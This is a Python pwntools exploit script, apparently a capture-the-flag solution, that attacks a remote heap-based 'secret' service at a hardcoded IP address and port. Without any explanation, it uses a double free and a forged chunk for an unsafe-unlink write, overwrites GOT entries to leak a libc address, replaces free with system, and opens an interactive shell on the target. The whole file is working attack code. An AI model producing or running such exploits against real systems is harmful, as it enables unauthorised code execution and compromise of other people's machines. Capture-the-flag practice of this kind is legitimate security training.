#!/usr/bin/env python
from pwn import *

r = remote('52.68.31.117', 5566)
def add(t, s):
    r.recvuntil('3. Renew secret\n')
    r.sendline('1')
    r.recvuntil('3. Huge secret\n')
    r.sendline(str(t))
    r.recvuntil(': \n')
    r.send(s)

def de(t):
    r.recvuntil('3. Renew secret\n')
    r.sendline('2')
    r.recvuntil('3. Huge secret\n')
    r.sendline(str(t))

def update(t, s):
    r.recvuntil('3. Renew secret\n')
    r.sendline('3')
    r.recvuntil('3. Huge secret\n')
    r.sendline(str(t))
    r.recvuntil(': \n')
    r.send(s)

add(1, 'a')
add(2, 'a')
de(1)
de(2)
add(3, 'a')
de(3)
add(3, 'a')
de(1)
add(1, 'a')
add(2, 'a')

f_ptr = 0x6020b0
fake_chunk = p64(0) + p64(0x21)
fake_chunk += p64(f_ptr - 0x18) + p64(f_ptr-0x10)
fake_chunk += p64(0x20) + p64(0x90)
fake_chunk += '\x00' * 0x80
fake_chunk += p64(0) + p64(0x21)
fake_chunk += '\x00' * 0x10
fake_chunk += p64(0) + p64(0x21)
update(3, fake_chunk)
de(2)

atoi_GOT = 0x602070
free_GOT = 0x602018
puts_GOT = 0x602020
puts_plt = 0x4006c0
puts_offset = 0x6f5d0
system_offset = 0x45380

f = p64(0)
f += p64(atoi_GOT) + p64(puts_GOT) + p64(free_GOT)
f += p32(1)*3
update(1, f)
update(1, p64(puts_plt))
de(3)
s = r.recv(6)
libc_base = u64(s.ljust(8, '\x00')) - puts_offset
system = libc_base + system_offset
update(2, p64(system))
r.recvuntil('3. Renew secret\n')
r.sendline('sh\0')


r.interactive()


